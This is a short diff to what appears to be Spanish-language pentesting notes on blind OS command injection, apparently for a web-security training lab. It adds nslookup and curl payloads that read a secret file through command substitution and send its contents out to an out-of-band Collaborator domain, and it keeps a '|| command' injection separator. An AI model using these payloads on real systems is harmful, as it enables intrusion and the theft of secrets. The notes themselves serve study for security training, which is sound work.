@@ -1,3 +1,14 @@
+###### Blind OS Command Injection: (hay que URL-Encodear)
+```bash
+nslookup $(cat /home/carlos/secret).[TU_ID_COLLABORATOR].oastify.com
+```
+
+```bash
+curl http://[TU_ID_COLLABORATOR].oastify.com/$(cat /home/carlos/secret)
+```
+
+---
+
 Simple
 ```
 || command
